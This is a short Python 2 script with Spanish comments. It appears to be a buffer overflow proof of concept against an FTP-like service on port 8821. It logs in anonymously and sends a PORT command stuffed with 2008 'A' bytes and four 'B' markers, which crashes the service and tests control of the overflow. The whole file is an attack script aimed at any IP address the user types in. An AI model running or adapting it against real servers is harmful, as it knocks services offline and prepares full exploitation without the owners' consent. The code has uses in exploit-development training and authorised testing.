#!/usr/bin/env python

import socket

bufA = '\x41'*2008           #introducimos A's hasta llegar al buffer overflow
bufB = "\x42\x42\x42\x42"      #metemos 4 últimas B's para saber cuando acaba el overflow e ir controlando


buffer= bufA + bufB

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = raw_input('Introduce la IP remota:')
connect=s.connect((ip,8821))
banner = s.recv(1024)
print banner
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS\r\n')
s.recv(1024)
s.send('PORT' + buffer + '\r\n')
s.close()

print "Vete y mira como va el tema!"

